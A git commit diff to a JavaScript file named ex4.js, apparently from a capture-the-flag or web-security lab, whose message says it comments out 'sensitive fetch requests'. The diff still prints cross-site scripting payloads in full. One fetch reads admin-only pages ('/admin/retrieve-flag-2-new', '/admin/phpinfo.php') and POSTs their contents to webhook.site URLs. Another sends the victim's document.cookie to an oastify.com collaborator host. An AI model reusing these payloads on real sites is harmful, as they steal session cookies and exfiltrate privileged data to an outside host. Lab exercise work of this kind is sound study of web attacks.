c0c22f8f8cb60c3cba17521beada31e4cce39bf8
0xB0xB <37478611+0xB0xB@users.noreply.github.com>
2026-01-14 11:04:57 +0400

    Comment out sensitive fetch requests in ex4.js

--- ex4.js
+++ ex4.js
@@ -1,3 +1,3 @@
-//fetch('/admin/retrieve-flag-2-new').then(r=>r.text()).then(d=>fetch('https://webhook.site/0b8aee5b-c91a-44fc-b825-d36d6ad0bc6e',{method:'POST',body:d}))
+//fetch('/admin/phpinfo.php').then(r=>r.text()).then(d=>fetch('https://webhook.site/20b80dbe-6c7a-486a-bea5-2e9d4e9d0470',{method:'POST',body:d}))
 
-fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
+//fetch('3qutedu6ifxiplg1m57kl2jbv21tpjd8.oastify.com/test='+document.cookie)
